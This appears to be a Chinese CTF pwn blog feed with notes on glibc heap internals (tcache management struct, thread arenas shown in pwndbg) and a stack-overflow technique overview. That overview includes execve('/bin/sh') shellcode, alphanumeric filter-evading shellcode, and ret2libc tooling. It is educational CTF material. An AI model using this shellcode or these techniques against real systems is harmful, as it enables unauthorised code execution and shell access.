class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span></span><br><span class="line"><span class="comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class="line"><span class="comment">   are redundant (we could have just counted the linked list each</span></span><br><span class="line"><span class="comment">   time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">uint16_t</span> counts[TCACHE_MAX_BINS]; <span class="comment">// 2*0x40 = 0x80</span></span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS]; <span class="comment">// 8*0x40 = 0x200</span></span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"><span class="comment">// 0x20+0x10*0x40 = 0x420  </span></span><br></pre></td></tr></table></figure><p>tcache_perthread_struct 是tcache的管理机构，也存在于堆中，如果想办法控制此结构体，即可控制tcache任意分配。<br>在glibc2.30以下的版本，counts的类型是char，此结构大小是0x250。</p><p>一般是作为辅助攻击的方法，可以简化攻击链。</p><h4 id="example">example</h4><p>[[2021-DownUnder-note]]</p><h3 id="global-max-fast">global_max_fast</h3><p>实际上就是house of corrison的利用，类似的，tcache也有类似的利用。使得大chunk被当作tcache处理。</p><h3 id="heap-info">heap_info</h3><p>直接攻击堆管理结构体，可以看看这篇帖子:<a href="http://phrack.org/issues/66/10.html">house-of-mind</a><br>#TODO</p><h1 id="Tricks">Tricks</h1><h2 id="多线程堆">多线程堆</h2><h3 id="堆布局与分配">堆布局与分配</h3><p>以下基于libc 2.35版本讲述</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">vmmap</span></span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">             Start                End Perm     Size Offset File</span><br><span class="line">    0x56234a398000     0x56234a399000 r--p     1000      0 /home/nemo/Pwn/workspace/2023ycb/heap/heap</span><br><span class="line">    0x56234a399000     0x56234a39a000 r-xp     1000   1000 /home/nemo/Pwn/workspace/2023ycb/heap/heap</span><br><span class="line">    0x56234a39a000     0x56234a39b000 r--p     1000   2000 /home/nemo/Pwn/workspace/2023ycb/heap/heap</span><br><span class="line">    0x56234a39b000     0x56234a39c000 r--p     1000   2000 /home/nemo/Pwn/workspace/2023ycb/heap/heap</span><br><span class="line">    0x56234a39c000     0x56234a39f000 rw-p     3000   3000 /home/nemo/Pwn/workspace/2023ycb/heap/heap</span><br><span class="line">    0x56234b28e000     0x56234b2af000 rw-p    21000      0 [heap]</span><br><span class="line">    0x7fc4627fd000     0x7fc4627fe000 ---p     1000      0 [anon_7fc4627fd]</span><br><span class="line">    0x7fc4627fe000     0x7fc462ffe000 rw-p   800000      0 [anon_7fc4627fe]</span><br><span class="line">    0x7fc462ffe000     0x7fc462fff000 ---p     1000      0 [anon_7fc462ffe]</span><br><span class="line">    0x7fc462fff000     0x7fc4637ff000 rw-p   800000      0 [anon_7fc462fff]</span><br><span class="line">    0x7fc4637ff000     0x7fc463800000 ---p     1000      0 [anon_7fc4637ff]</span><br><span class="line">    0x7fc463800000     0x7fc464000000 rw-p   800000      0 [anon_7fc463800]</span><br><span class="line">    0x7fc464000000     0x7fc464021000 rw-p    21000      0 [anon_7fc464000]</span><br><span class="line">    0x7fc464021000     0x7fc468000000 ---p  3fdf000      0 [anon_7fc464021]</span><br><span class="line">    0x7fc4685fa000     0x7fc4685fb000 ---p     1000      0 [anon_7fc4685fa]</span><br><span class="line">    0x7fc4685fb000     0x7fc468dfb000 rw-p   800000      0 [anon_7fc4685fb]</span><br><span class="line">    0x7fc468dfb000     0x7fc468dfc000 ---p     1000      0 [anon_7fc468dfb]</span><br><span class="line">    0x7fc468dfc000     0x7fc4695fc000 rw-p   800000      0 [anon_7fc468dfc]</span><br><span class="line">    0x7fc4695fc000     0x7fc4695fd000 ---p     1000      0 [anon_7fc4695fc]</span><br><span class="line">    0x7fc4695fd000     0x7fc469dfd000 rw-p   800000      0 [anon_7fc4695fd]</span><br><span class="line">    0x7fc469dfd000     0x7fc469dfe000 ---p     1000      0 [anon_7fc469dfd]</span><br><span class="line">    0x7fc469dfe000     0x7fc46a5fe000 rw-p   800000      0 [anon_7fc469dfe]</span><br><span class="line">    0x7fc46a5fe000     0x7fc46a5ff000 ---p     1000      0 [anon_7fc46a5fe]</span><br><span class="line">    0x7fc46a5ff000     0x7fc46adff000 rw-p   800000      0 [anon_7fc46a5ff]</span><br><span class="line">    0x7fc46adff000     0x7fc46ae00000 ---p     1000      0 [anon_7fc46adff]</span><br><span class="line">    0x7fc46ae00000     0x7fc46b600000 rw-p   800000      0 [anon_7fc46ae00]</span><br><span class="line">    0x7fc46b600000     0x7fc46b628000 r--p    28000      0 /home/nemo/Pwn/workspace/2023ycb/heap/libc-3.</span><br><span class="line">35.so</span><br></pre></td></tr></table></figure><p>在线程分配空间时，会从线程堆中分配，但并不是每一个线程都有一个单独的线程堆，arena存在一个上限。</p><p>在上述程序中，线程堆的地址就是 <code>0x7fc464000000</code> 开始的这一部分。</p><p>查看此线程堆的组成：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">telescope 0x7fc464000000</span></span><br><span class="line">00:0000│  0x7fc464000000 —▸ 0x7fc464000030 ◂— 0x200000000</span><br><span class="line">01:0008│  0x7fc464000008 ◂— 0x0</span><br><span class="line">02:0010│  0x7fc464000010 ◂— 0x21000</span><br><span class="line">03:0018│  0x7fc464000018 ◂— 0x21000</span><br><span class="line">04:0020│  0x7fc464000020 ◂— 0x1000</span><br><span class="line">05:0028│  0x7fc464000028 ◂— 0x0</span><br><span class="line">06:0030│  0x7fc464000030 ◂— 0x200000000</span><br><span class="line">07:0038│  0x7fc464000038 ◂— 0x1</span><br></pre></td></tr></table></figure><p>可以看出前0x30 的部分，是mmap分配出的内存的header。</p><p>继续往下查看:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">arena 0x7fc464000030</span>           </span><br><span class="line">&#123;                  </span><br><span class="line">  mutex = 0,                  </span><br><span class="line">  flags = 2,        </span><br><span class="line">  have_fastchunks = 1,               </span><br><span class="line">  fastbinsY = &#123;0x7fc464000e10, 0x0, 0x0, 0x0, 0x7fc464000e30, 0x0, 0x0, 0x0, 0x0, 0x0&#125;,         </span><br><span class="line">  top = 0x7fc464000fa0,       </span><br><span class="line">  last_remainder = 0x0,                            </span><br><span class="line">  bins = &#123;....&#125;</span><br><span class="line">  binmap = &#123;0, 0, 0, 0&#125;,</span><br><span class="line">  next = 0x7fc46b819c80 &lt;main_arena&gt;,</span><br><span class="line">  next_free = 0x0,</span><br><span class="line">  attached_threads = 0,</span><br><span class="line">  system_mem = 135168,</span><br><span class="line">  max_system_mem = 135168,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出从0x30开始，就是线程堆的arena</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap 0x7fc4640008d0</span>   </span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE          </span><br><span class="line">Addr: 0x7fc4640008d0                   </span><br><span class="line">Size: 0x291            </span><br><span class="line">fd: 0x7fc464000090            </span><br><span class="line">bk: 0x7fc464000090</span><br><span class="line">Allocated chunk | NON_MAIN_ARENA          </span><br><span class="line">Addr: 0x7fc464000b60                    </span><br><span class="line">Size: 0x24</span><br><span class="line">Allocated chunk | PREV_INUSE | NON_MAIN_ARENA          </span><br><span class="line">Addr: 0x7fc464000b80                    </span><br><span class="line">Size: 0x75</span><br><span class="line">Allocated chunk | PREV_INUSE | NON_MAIN_ARENA          </span><br><span class="line">Addr: 0x7fc464000bf0                    </span><br><span class="line">Size: 0x25</span><br></pre></td></tr></table></figure><p>继续往下查看，可以看到有一个0x290大小的堆块，应该是tcache 的管理结构体，为什么是free状态呢? 笔者暂且还没有探究，不过，经过笔者的测试，在此时，分配chunk也并不走tcache，而是直接走fastbin 。 #TODO</p><h3 id="调试">调试</h3><p>查找多线程arena:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">arena</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看其next指针</span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">arena &lt;next_addr&gt;</span></span><br></pre></td></tr></table></figure><p>查看多线程heap:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">heap &lt;start_addr&gt;</span> </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">起始地址，一般偏移为0x8d0</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;关于heap我所知道的一切&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://v3rdant.cn/categories/CTF/"/>
    
    
    <category term="Pwn" scheme="https://v3rdant.cn/tags/Pwn/"/>
    
    <category term="CTF" scheme="https://v3rdant.cn/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Pwn.Stack-Overflow-Overview</title>
    <link href="https://v3rdant.cn/Pwn.Stack-Overflow-Overview/"/>
    <id>https://v3rdant.cn/Pwn.Stack-Overflow-Overview/</id>
    <published>2022-08-02T16:00:00.000Z</published>
    <updated>2024-02-28T15:02:54.692Z</updated>
    
    <content type="html"><![CDATA[<h3 id="杂谈">杂谈</h3><p>作为一种基本的漏洞，栈溢出在CTF中出现的非常频繁，因为其多样化的利用形式，难以进行系统的归类，本文结合笔者个人的经验，综合讨论各种栈溢出技术，如果有遗漏，欢迎评论留言，或者给笔者发邮件，进行补充。</p><span id="more"></span><p>本文一定程度上参考了各种博客，CTF-wiki, CTF-All-in-One</p><p>怎么去看待栈溢出题呢?</p><p>尽管利用方法多样，但是，就笔者个人的看法而言，整个栈溢出实际上只分为三种:</p><p><strong>ret2syscall,  ret2libc,  ret2shellcode</strong></p><p>实际上应该还有ret2text， 然而实在过于简单，一般不会在ctf题目中出现。</p><p>一般而言，pwn题的目的都是<code>getshell</code>(当然，也有直接读取flag的，这个后面单独谈)，而<code>getshell</code> 无外乎就三种途径，<code>syscall</code>，<code>libc-system</code>，<code>shellcode</code></p><p>当拿到一个题目时，首先思考：</p><p>是否有syscall----&gt;ret2syscall</p><p>有可读可写内存空间吗----&gt;ret2shellcode</p><p>给了libc文件或者有信息泄露函数(IO函数)----&gt;ret2libc</p><p>接下来，再分门别类谈:</p><h3 id="ret2syscall">ret2syscall</h3><p>因为syscall属于相对简单的，暂且放在前面谈。</p><table><thead><tr><th style="text-align:left">%rax</th><th style="text-align:left">System call</th><th style="text-align:left">%rdi</th><th style="text-align:left">%rsi</th><th style="text-align:left">%rdx</th><th style="text-align:left">%r10</th><th style="text-align:left">%r8</th><th style="text-align:left">%r9</th></tr></thead><tbody><tr><td style="text-align:left">59</td><td style="text-align:left">sys_execve</td><td style="text-align:left">const char *filename</td><td style="text-align:left">const char *const argv[]</td><td style="text-align:left">const char *const envp[]</td><td style="text-align:left"></td><td style="text-align:left"></td><td style="text-align:left"></td></tr></tbody></table><p>一般而言，需要<code>syscall</code>的题目中，都是构造这个系统调用实现。</p><p>而在一些题目中通过<code>seccomp</code>禁用了<code>execve</code>的调用，所以不能直接利用，那么就利用open, read,  write 直接读取flag文件，也是一种办法。</p><p>而在syscall中，最为重要也是最麻烦的一步，就是在哪个地址写入/bin/sh（如果本地文件没有/bin/sh的话），一般而言，有三个选择，.data, .bss， 栈上。</p><p>在没开PIE的程序中，可以考虑通过write写入.data段或者买.bss段。</p><p>或者考虑通过rsp获取栈上地址，或者partial overwrite带出栈上地址。</p><p>总的而言，就是选择能够获取到地址的地方写入/bin/sh。</p><p><strong>例题:</strong></p><p>ciscn_s_3</p><h3 id="ret2shellcode">ret2shellcode</h3><h4 id="shellcode的书写">shellcode的书写</h4><p>一般而言，可以直接通过pwntools 相应模块直接生成shellcode，然而现在以shellcode为考点的题目，一般都会对shellcode做出限制，诸如不能包含非可打印字符, 不能包含&quot;\x00&quot;等等。所以尽可能自己熟悉shellcode的书写。</p><p>一个简单的shellcode例子:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// execve(path = &#x27;/bin///sh&#x27;, argv = [&#x27;sh&#x27;], envp = 0)</span></span><br><span class="line">push <span class="number">0x68</span></span><br><span class="line">mov rax, <span class="number">0x732f2f2f6e69622f</span></span><br><span class="line">push rax</span><br><span class="line">mov rdi, rsp</span><br><span class="line"><span class="comment">// push argument array [&#x27;sh\x00&#x27;]</span></span><br><span class="line"><span class="comment">// push b&#x27;sh\x00&#x27; </span></span><br><span class="line">push <span class="number">0x1010101</span> ^ <span class="number">0x6873</span></span><br><span class="line">xor dword ptr [rsp], <span class="number">0x1010101</span></span><br><span class="line">xor esi, esi <span class="comment">/* 0 */</span></span><br><span class="line">push rsi <span class="comment">/* null terminate */</span></span><br><span class="line">push <span class="number">8</span></span><br><span class="line">pop rsi</span><br><span class="line">add rsi, rsp</span><br><span class="line">push rsi <span class="comment">/* &#x27;sh\x00&#x27; */</span></span><br><span class="line">mov rsi, rsp</span><br><span class="line">xor edx, edx <span class="comment">/* 0 */</span></span><br><span class="line"><span class="comment">// call execve()</span></span><br><span class="line">push SYS_execve <span class="comment">/* 0x3b */</span></span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>这里获取<code>/bin/sh</code>地址的方式，是将其压入栈中，再通过rsp偏移获取相应地址。</p><p>不过一般而言，pwn题目运行shellcode，一般是采用寄存器跳转，即<code>jmp  rax</code>此类，那么其实可以通过跳转寄存器获取shellcode存放地址，并且将/bin/sh直接镶入shellcode后面，简化shellcode书写。</p><p>同时，有些题目会对shellcode有所限制，限制只能包含可打印字符或者纯粹字母数字。这就限制了shellcode的书写，<code>mov</code>和<code>syscall</code>都会遭到限制， 可用指令如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>数据传送:</span><br><span class="line">push/pop eax…</span><br><span class="line">pusha/popa</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>算术运算:</span><br><span class="line">inc/dec eax…</span><br><span class="line">sub al, 立即数</span><br><span class="line">sub byte ptr [eax… + 立即数], al dl…</span><br><span class="line">sub byte ptr [eax… + 立即数], ah dh…</span><br><span class="line">sub dword ptr [eax… + 立即数], esi edi</span><br><span class="line">sub word ptr [eax… + 立即数], si di</span><br><span class="line">sub al dl…, byte ptr [eax… + 立即数]</span><br><span class="line">sub ah dh…, byte ptr [eax… + 立即数]</span><br><span class="line">sub esi edi, dword ptr [eax… + 立即数]</span><br><span class="line">sub si di, word ptr [eax… + 立即数]</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>逻辑运算:</span><br><span class="line">and al, 立即数</span><br><span class="line">and dword ptr [eax… + 立即数], esi edi</span><br><span class="line">and word ptr [eax… + 立即数], si di</span><br><span class="line">and ah dh…, byte ptr [ecx edx… + 立即数]</span><br><span class="line">and esi edi, dword ptr [eax… + 立即数]</span><br><span class="line">and si di, word ptr [eax… + 立即数]</span><br><span class="line"></span><br><span class="line">xor al, 立即数</span><br><span class="line">xor byte ptr [eax… + 立即数], al dl…</span><br><span class="line">xor byte ptr [eax… + 立即数], ah dh…</span><br><span class="line">xor dword ptr [eax… + 立即数], esi edi</span><br><span class="line">xor word ptr [eax… + 立即数], si di</span><br><span class="line">xor al dl…, byte ptr [eax… + 立即数]</span><br><span class="line">xor ah dh…, byte ptr [eax… + 立即数]</span><br><span class="line">xor esi edi, dword ptr [eax… + 立即数]</span><br><span class="line">xor si di, word ptr [eax… + 立即数]</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span>比较指令:</span><br><span class="line">cmp al, 立即数</span><br><span class="line">cmp byte ptr [eax… + 立即数], al dl…</span><br><span class="line">cmp byte ptr [eax… + 立即数], ah dh…</span><br><span class="line">cmp dword ptr [eax… + 立即数], esi edi</span><br><span class="line">cmp word ptr [eax… + 立即数], si di</span><br><span class="line">cmp al dl…, byte ptr [eax… + 立即数]</span><br><span class="line">cmp ah dh…, byte ptr [eax… + 立即数]</span><br><span class="line">cmp esi edi, dword ptr [eax… + 立即数]</span><br><span class="line">cmp si di, word ptr [eax… + 立即数]</span><br><span class="line"></span><br><span class="line"><span class="number">5.</span>转移指令:</span><br><span class="line">push <span class="number">56</span>h</span><br><span class="line">pop eax</span><br><span class="line">cmp al, <span class="number">43</span>h</span><br><span class="line">jnz lable</span><br><span class="line"></span><br><span class="line">&lt;=&gt; jmp lable</span><br><span class="line"></span><br><span class="line"><span class="number">6.</span>交换al, ah</span><br><span class="line">push eax</span><br><span class="line">xor ah, byte ptr [esp] <span class="comment">// ah ^= al</span></span><br><span class="line">xor byte ptr [esp], ah <span class="comment">// al ^= ah</span></span><br><span class="line">xor ah, byte ptr [esp] <span class="comment">// ah ^= al</span></span><br><span class="line">pop eax</span><br><span class="line"></span><br><span class="line"><span class="number">7.</span>清零:</span><br><span class="line">push <span class="number">44</span>h</span><br><span class="line">pop eax</span><br><span class="line">sub al, <span class="number">44</span>h ; eax = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">push esi</span><br><span class="line">push esp</span><br><span class="line">pop eax</span><br><span class="line">xor [eax], esi ; esi = <span class="number">0</span></span><br></pre></td></tr></table></figure><p>一般而言,  我们采用<code>xor</code>或者<code>sub</code>指令修改shellcode后面的值，构造<code>0f 05</code>， 实现syscall。</p><p>一个例子(纯字母数字shellcode):</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ref: https://hama.hatenadiary.jp/entry/2017/04/04/190129</span></span><br><span class="line"><span class="comment">/* from call rax */</span></span><br><span class="line">push rax</span><br><span class="line">push rax</span><br><span class="line">pop rcx</span><br><span class="line"></span><br><span class="line"><span class="comment">/* XOR pop rsi, pop rdi, syscall */</span></span><br><span class="line">push <span class="number">0x41413030</span></span><br><span class="line">pop rax</span><br><span class="line">xor DWORD PTR [rcx+<span class="number">0x30</span>], eax</span><br><span class="line"></span><br><span class="line"><span class="comment">/* XOR /bin/sh */</span></span><br><span class="line">push <span class="number">0x34303041</span></span><br><span class="line">pop rax</span><br><span class="line">xor DWORD PTR [rcx+<span class="number">0x34</span>], eax</span><br><span class="line">push <span class="number">0x41303041</span></span><br><span class="line">pop rax</span><br><span class="line">xor DWORD PTR [rcx+<span class="number">0x38</span>], eax</span><br><span class="line"></span><br><span class="line"><span class="comment">/* rdi = &amp;&#x27;/bin/sh&#x27; */</span></span><br><span class="line">push rcx</span><br><span class="line">pop rax</span><br><span class="line">xor al, <span class="number">0x34</span></span><br><span class="line">push rax</span><br><span class="line"></span><br><span class="line"><span class="comment">/* rdx = 0 */</span></span><br><span class="line">push <span class="number">0x30</span></span><br><span class="line">pop rax</span><br><span class="line">xor al, <span class="number">0x30</span></span><br><span class="line">push rax</span><br><span class="line">pop rdx</span><br><span class="line"></span><br><span class="line">push rax</span><br><span class="line"></span><br><span class="line"><span class="comment">/* rax = 59 (SYS_execve) */</span></span><br><span class="line">push <span class="number">0x41</span></span><br><span class="line">pop rax</span><br><span class="line">xor al, <span class="number">0x7a</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* pop rsi, pop rdi*/</span></span><br><span class="line"><span class="comment">/* syscall */</span> </span><br><span class="line">.byte <span class="number">0x6e</span></span><br><span class="line">.byte <span class="number">0x6f</span></span><br><span class="line">.byte <span class="number">0x4e</span></span><br><span class="line">.byte <span class="number">0x44</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* /bin/sh */</span></span><br><span class="line">.byte <span class="number">0x6e</span></span><br><span class="line">.byte <span class="number">0x52</span></span><br><span class="line">.byte <span class="number">0x59</span></span><br><span class="line">.byte <span class="number">0x5a</span></span><br><span class="line">.byte <span class="number">0x6e</span></span><br><span class="line">.byte <span class="number">0x43</span></span><br><span class="line">.byte <span class="number">0x5a</span></span><br><span class="line">.byte <span class="number">0x41</span></span><br></pre></td></tr></table></figure><p>构造尽可能短的shellcode可能用到的一些指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cdp  </span><br><span class="line">%The CDQ instruction copies the sign (bit 31) </span><br><span class="line">%of the value in the EAX register into every bit </span><br><span class="line">%position in the EDX register. </span><br></pre></td></tr></table></figure><h4 id="shellcode生成工具">shellcode生成工具</h4><p>同时，现在有多种针对shellcode进行编码的生成工具，生成符合限制的shellcode，如msf，alpha3等等，由于我没有用过，可以自行尝试。</p><h4 id="mprotect">mprotect()</h4><p>进一步的，很多题目没有天然的readable  and  executable segment，题目可能通过mmap()映射了一段权限为7的段，或者存在mprotect()函数。</p><p>这个函数可以修改指定内存段的权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mprotect:</span><br><span class="line">int mprotect(void *addr, size_t len, int prot);</span><br><span class="line">addr 内存起始地址</span><br><span class="line">len  修改内存的长度</span><br><span class="line">prot 内存的权限，7为可读可写可执行</span><br></pre></td></tr></table></figure><p>如果存在这样的函数，可以考虑将其加入ROP链，从而进一步调用shellcode</p><h3 id="ret2libc">ret2libc</h3><h4 id="leak-libc">leak_libc</h4><p>对于最后调用 libc 中 system 的题目而言，需要考虑的首要问题就是leak_libc.</p><p>目前而言，我遇到的栈题中leak_libc，有两种方法：</p><ol><li>partial_overwrite, 有时候，在栈中会存留libc中地址，在后面存在直接输出的函数的情况下，可以带出此地址。</li><li>通过puts，write等函数，打印<code>.got</code>，获取对应函数的地址，这里，在没有给定对应libc版本的情况下，也可以通过LibcSearcher查找对应libc版本</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ref:  https://github.com/lieanu/LibcSearcher</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#第二个参数，为已泄露的实际地址,或最后12位(比如：d90)，int类型</span></span><br><span class="line">obj = LibcSearcher(<span class="string">&quot;fgets&quot;</span>, <span class="number">0X7ff39014bd90</span>)</span><br><span class="line"></span><br><span class="line">obj.dump(<span class="string">&quot;system&quot;</span>)        <span class="comment">#system 偏移</span></span><br><span class="line">obj.dump(<span class="string">&quot;str_bin_sh&quot;</span>)    <span class="comment">#/bin/sh 偏移</span></span><br><span class="line">obj.dump(<span class="string">&quot;__libc_start_main_ret&quot;</span>)    </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>另一个可以本地部署的实用工具是libc-database</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ ./find <span class="built_in">printf</span> 260 puts f30</span><br><span class="line">archive-glibc (libc6_2.19-10ubuntu2_i386)</span><br><span class="line">$ ./dump libc6_2.19-0ubuntu6.6_i386</span><br><span class="line">offset___libc_start_main_ret = 0x19a83</span><br><span class="line">offset_system = 0x00040190</span><br><span class="line">offset_dup2 = 0x000db590</span><br><span class="line">offset_recv = 0x000ed2d0</span><br><span class="line">offset_str_bin_sh = 0x160a24</span><br><span class="line">$ ./identify bid=ebeabf5f7039f53748e996fc976b4da2d486a626</span><br><span class="line">libc6_2.17-93ubuntu4_i386</span><br><span class="line">$ ./identify md5=af7c40da33c685d67cdb166bd6ab7ac0</span><br><span 